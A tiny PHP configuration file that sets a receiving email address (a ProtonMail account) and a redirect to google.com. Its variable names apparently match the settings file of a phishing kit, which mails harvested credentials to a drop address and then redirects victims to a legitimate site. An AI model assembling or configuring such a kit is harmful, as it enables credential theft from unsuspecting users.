<?php 
$Receive_email="future.compass@protonmail.com";
$redirect="https://www.google.com/";
?>